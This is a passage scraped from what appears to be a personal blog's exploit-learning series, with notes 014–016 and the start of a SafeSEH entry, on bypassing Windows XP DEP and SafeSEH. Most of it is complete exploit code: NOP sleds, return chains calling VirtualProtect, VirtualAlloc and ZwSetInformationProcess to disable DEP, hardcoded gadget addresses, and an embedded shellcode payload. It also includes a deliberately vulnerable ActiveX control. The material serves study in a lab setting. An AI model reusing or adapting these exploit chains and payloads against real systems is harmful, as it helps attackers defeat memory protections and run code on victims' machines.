\u0026#34;\\xBA\\xD9\\xBB\\x7C\u0026#34;//修正EBP retn 4 \u0026#34;\\x5F\\x78\\xA6\\x7C\u0026#34;//pop retn \u0026#34;\\x08\\x00\\x14\\x00\u0026#34;//可执行内存中弹出对话框机器码的起始地址 \u0026#34;\\x00\\x00\\x14\\x00\u0026#34;//可执行内存空间地址，复制用 \u0026#34;\\xBF\\x7D\\xC9\\x77\u0026#34;//push esp jmp eax \u0026amp;\u0026amp; 原始 shellcode 起始地址 \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34;//shellcode 长度 \u0026#34;\\xAC\\xAF\\x94\\x7C\u0026#34;//memcpy \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;......\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; ; void test() { char tt[176]; memcpy(tt, shellcode, 450); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } Postscript It is reasonable to have RWE access to the memory area, but unfortunately, this experiment was not completed NET attack on DEP Principle NET files have the same structure as PE files, i.e. they also have .text and other segments, which are also mapped to memory and have certain executable properties. NET with executable attributes, and then let the program execute in this area to execute the shellcode. Requirements ActiveX control with overflow vulnerability NET control with shellcode POC page that can trigger an overflow vulnerability in the ActiveX control Code ActiveX control with overflow vulnerability\n1 2 3 4 5 6 7 8 void CVulnerAXCtrl::test(LPCTSTR str) { // AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: Add your dispatch handler code here printf(\u0026#34;aaaa\u0026#34;); // 定位该函数的标记 char dest[100]; sprintf(dest, \u0026#34;%s\u0026#34;, str); } .NET control with shellcode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 using System; using System.Collections.Generic; using System.Linq; using System.Text; namespace DEP_NETDLL { public class Class1 { public void Shellcode() { string shellcode = \u0026#34;\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\u0026#34; + \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\u0026#34; + \u0026#34;\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\u0026#34; + \u0026#34;\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\u0026#34; + \u0026#34;\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\u0026#34; + \u0026#34;\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\u0026#34; + \u0026#34;\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\u0026#34; + \u0026#34;\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\u0026#34; + \u0026#34;\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\u0026#34; + \u0026#34;\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\u0026#34; + \u0026#34;\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\u0026#34; + \u0026#34;\\uff53\\ufc57\\uff53\\uf857\u0026#34; ; } } } Challenging DEP with Java Applet Difficult to find a suitable version, so this experiment is skipped and will be added later when I have a chance\n","date":"2020-11-20T14:13:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-016-executable-memory-and-.net-attack-dep/","title":"Exploit learning notes 016 executable memory and .net attack DEP"},{"content":"Source: Moeomu\u0026rsquo;s blog\nUse VirtualProtect to attack DEP Principle Use the VirtualProtect function to change the stack page memory attribute to executable\nPreceding content VirtualProtect parameters 1 2 3 4 5 6 7 8 9 10 11 12 13 14 BOOL VirtualProtect( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); // 所以可以这样写 BOOL VirtualProtect( shellcode StartAddressOfMemorySpace, shellcode Size, 0x40, AWritableAddress ); There are bound to be zeros here, so the attack function is replaced with memcpy Steps Fix the EBP so that when the function is called, there is no memory read violation and an exception is thrown Fill in the address of VirtualProtect, which will be returned here Fill in the empty instruction Fill in the return address Fill in the parameters of the function Fill in the shellcode itself Code Simulation environment: System: Windows XP SP3, DEP: Optout, Compiler: VC6, Compile options: Disable optimization, Version: release\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #include\u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x85\\x8B\\x1D\\x5D\u0026#34; // push esp pop ebp ret `fix ebp` \u0026#34;\\xD4\\x1A\\x80\\x7C\u0026#34; // VirtualProtect Address \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x8C\\xFE\\x12\\x00\u0026#34; // ret Address \u0026#34;\\xB0\\xFD\\x12\\x00\u0026#34; // Param Address: 0x0012FDB0 \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34; // Param Size: 0x100 \u0026#34;\\x40\\x00\\x00\\x00\u0026#34; // Param NewProtect: 0x40 \u0026#34;\\x00\\x00\\x3F\\x00\u0026#34; // Param pOldProtect: 0x00910000 \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; // payload \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ; void test() { char str[176]; memcpy(str, shellcode, 420); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } Attack DEP with VirtualAlloc Preceding content VirtualAlloc parameters 1 2 3 4 5 6 LPVOID WINAPI VirtualAlloc( __in_opt LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flAllocationType, __in DWORD flProtect ) Parameter description lpAddress, the address of the requested memory area, if this parameter is NULL, the system will decide the location of the allocated memory area and round up by 64KB. dwSize, the size of the requested memory area flAllocationType, the type of memory to be requested flProtect, the type of access control for the requested memory, such as read, write, execute, etc. The function returns the starting address of the requested memory when the memory request is successful, and returns NULL when the request fails Code Simulation environment: System: Windows XP SP3, DEP: Optout, Compiler: VC6, Compile options: Disable optimization, Version: release\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x85\\x8B\\x1D\\x5D\u0026#34; // push esp pop ebp ret 4 \u0026#34;\\xE1\\x9A\\x80\\x7C\u0026#34; // Address of VirtualAlloc \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x70\\x6F\\xC1\\x77\u0026#34; // VirtualAlloc ret address \u0026#34;\\x00\\x00\\x03\\x00\u0026#34; // Param: lpAddress \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34; // Param: dwSize \u0026#34;\\x00\\x10\\x00\\x00\u0026#34; // Param: flAllocationType \u0026#34;\\x40\\x00\\x00\\x00\u0026#34; // Param: flProtect \u0026#34;\\x00\\x00\\x03\\x00\u0026#34; // memcpy ret address \u0026#34;\\x00\\x00\\x03\\x00\u0026#34; // Param: destin \u0026#34;\\x94\\xFE\\x13\\x00\u0026#34; // Param: source \u0026#34;\\xFF\\x00\\x00\\x00\u0026#34; // Param: n \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; // payload \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ; void test() { char tt[176]; memcpy(tt, shellcode, 450); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } Technical details First use VirtualAlloc to request a section of space for shellcode execution Then use memcpy to copy the shellcode over Finally, when memcpy returns, it returns directly to the starting address of the shellcode payload ","date":"2020-11-19T17:43:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-015-using-virtualprotect-and-virtualalloc-attack-dep/","title":"Exploit learning notes 015 Using VirtualProtect and VirtualAlloc attack DEP"},{"content":"Source: Moeomu\u0026rsquo;s blog\nIntroduction to DEP The root cause of overflow attacks is the failure to accurately distinguish between data and code, but redesigning the computer architecture is unlikely, so various approaches are used to mitigate overflow attacks\nPrinciple The memory page where the data is located is marked as non-executable, and the CPU will throw an execution exception when the program successfully overflows into the shellcode DEP is divided into software DEP and hardware DEP, while software DEP refers to SafeSEH, hardware DEP is called No-Execute Page-Protection (NX) on AMD platforms and Execute Disable Bit (XD) on Intel platforms The operating system indicates that the code cannot be executed from here by setting the NX and XD tags on the memory page, and a tag is inserted in the PageTable to identify whether this page is running execution instructions, with 0 indicating allowed and 1 indicating not allowed The working status of DEP Optin: Allow system components and services to use DEP, other programs will not be protected, and the user can mark the program to use DEP through the ACT tool, this protection can be dynamically closed by the program, mostly used for ordinary user operating systems Output: Enable DEP for programs that are excluded from the list, mostly used in server operating systems AlwaysOn: DEP protection is applied to all programs and cannot be turned off, only 64-bit operating systems use this mode AlwaysOff: not used in general Compile options /NXCOMPAT compile option will set IMAGE_DLLCHARACTERISTICS_ NX_COMPAT flag in PE header, located in IMAGE_OPTIONAL_HEADER in DllCharacteristics, a value of 0x100 means DEP is enabled\nChallenging DEP with Ret2Libc Principle The reason for overflow failure during DEP protection is that DEP detects that the code is executing on a non-executable page, and if the program is allowed to jump directly to a pre-existing system function, it will necessarily not be intercepted Ret2Libc is the abbreviation of Return-to-libc, if each exploit finds a replacement in the system lib, then this exp must be executed correctly, but the problem is that not every instruction does not contain 0, and it is easy to jump to the wrong place constantly Here are three possible ways Jump to ZwSetinfomationProcess function to turn off DEP and go to shellcode Jump to VirtualProtect to make the shellcode page executable, then go to shellcode execution Jump to VirtualAlloc to request a piece of executable memory space and then jump to shellcode execution Try ZwSetinfomationProcess to close DEP Preceding content The DEP identifier of a process is present in the _KEXECUTE_OPTION of the KPROCESS structure and can be modified by the API function _KEXECUTE_OPTION structure\n1 2 3 4 5 6 7 Pos0ExecuteDisable:1bit Pos1ExecuteEnable:1bit Pos2DisableThunkEmulation:1bit Pos3Permanent:1bit Pos4ExecuteDispatchEnable:1bit Pos5ImageDispatchEnable:1bit Pos6Spare:2bit When the current process DEP is on, ExecuteDisable will be set to 1 When the current process DEP is closed, ExecuteEnable will be set to 1. DisableThunkEmulation is set for ATL compatibility Permanent is set to 1 to indicate that none of these flags can be modified We can set ExecuteEnable to 1 by setting the value of _KEXECUTE_OPTIONS to 0x02(00000010). shellcode principle The LdrpCheckNXCompatibility function checks for DEP compatibility and will turn off DEP if one of the following conditions is met The DLL is protected by the SafeDisc copyright protection system If the DLL contains .aspack, .pcle, .sforce, etc. bytes When the DLL exists in a module declared in the registry that does not require DEP to be enabled HKEY_LOCAL_MACHINE\\SOFTWARE \\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions Code Test environment: System: Windows XP SP3, DEP Status: Optout, Compiler: VC6, Compile Options: Disable Optimization, Version: release\n1 2 3 4 5 6 7 8 ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; ZwSetInformationProcess( NtCurrentProcess(), // Handle(-1) ProcessExecuteFlags, //0x22 \u0026amp;ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags) //0x4 ); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x52\\xE2\\x92\\x7C\u0026#34; // mov eax, 1 \u0026#34;\\x96\\x73\\x1B\\x5D\u0026#34; // mov ebp, esp \u0026amp; esp+8 \u0026#34;\\x1E\\xAD\\x17\\x5D\u0026#34; // esp+0x24 \u0026#34;\\xB4\\xC1\\xC5\\x7D\u0026#34; // jmp esp \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x24\\xCD\\x93\\x7C\u0026#34; // call Close DEP \u0026#34;\\x90\\x90\\xE9\\x2D\u0026#34; // jmp to shellcode start \u0026#34;\\xFF\\xFF\\xFF\\x90\u0026#34; ; void test() { char tt[176]; strcpy(tt,shellcode); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } Technical details Need to compare whether al is 1 or not, so the first step retn will return to mov eax, 1, the address of retn, this address will return to the location of repair ebp Because before calling the function, the value in ebp will be accessed, but it has been swiped, so ebp will be repaired, here we use push esp, pop ebp, retn three instructions to assign the address in esp to ebp, because retn is followed by a number, so ebp will add this number, that is ebp+8, at this time ebp is smaller than esp, once the subroutine is called, the stack area will be destroyed, so we still have to add some more ebp, I choose to add 0x24 to esp, and the previous 0x8 to make a stack space of 0x30, so that in the return time will return to the statement retn 0x24. The retn 0x24 statement will return to the place where the function ZwSetInformationProcess is called to close the DEP, and after that it will use the leave statement and retn, so it will return to the address of jmp esp. Jump from jmp esp to the address where \\x24\\xCD\\x93\\x7C data is stored, and this garbage data will not affect the execution of shellcode Just write a jump after the garbage data, and then jump to the real execution of shellcode ","date":"2020-11-19T12:42:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-014-dep-introduction/","title":"Exploit learning notes 014 DEP Introduction"},{"content":"Source: Moeomu\u0026rsquo;s blog\nSafeSEH Introduction Work Check if the exception handling chain is located in the current program\u0026rsquo;s stack. If it is not in the current stack, the program will terminate the exception handling function call. Check if the exception handler pointer points to the current program\u0026rsquo;s stack. If it points to the current stack, the program will terminate the exception handler call. After the first two checks are passed, the program calls a brand new function RtlIsValidHandler() to verify the validity of the exception handling function, and this function does the following Determine if the address of the exception handling function is in the memory space of the loaded module, if it belongs to the memory space of the loaded module, the validation function will perform the following checks in turn. Determine whether the program has set the IMAGE_DLLCHARACTERISTICS_NO_SEH flag. If this flag is set, exceptions within this program will be ignored. So when this flag is set, the function returns the checksum failure directly. Detects if the program contains a security S.E.H table. If the program contains the safety S.E.H table, the current exception handling function address is matched with this table, and a successful match returns a check success, a failed match returns a check failure. Determine whether the program sets the ILonly flag. If this flag is set, it means that the program contains only the .NET compiled intermediate language and the function directly returns a checksum failure. Determine if the address of the exception handling function is located on a non-executable page. When the address of the exception handler is on a non-executable page, the check function will check whether DEP is enabled or not, and return a successful check if the system does not enable DEP, otherwise the program throws an access violation exception. If the address of the exception handling function is not included in the memory space of the loaded module, the check function will directly perform DEP related detection, and the function will perform the following checks in turn. Determine if the address of the exception handling function is located on a non-executable page (non-executable page). When the address of the exception handling function is located on the non-executable page, the check function will check whether DEP is on or not, if the system is not on DEP, the check will return to success, otherwise the program throws an access violation exception. Determine whether the system allows jumping to execute outside the memory space of the loaded module, if it does, then return the validation success, otherwise return the validation failure. Flowchart of RtlIsValidHandler() function detection\nFeasibility analysis Exception handling function is located outside the memory range of the load module and DEP is closed The exception handling function is located within the memory range of the load module, the corresponding module is not SafeSEH enabled (the SafeS.E.H table is empty), and the corresponding module is not pure IL The exception handling function is located in the memory range of the loaded module, the corresponding module is SafeSEH enabled (the SafeS.E.H table is not empty), and the address of the exception handling function is included in the SafeS.E.H table Ultimate solution: arrange the shellcode in the heap area, even if SEH verification is not feasible it will still be called\nBypass SEH in the heap Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ; char overflowcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; 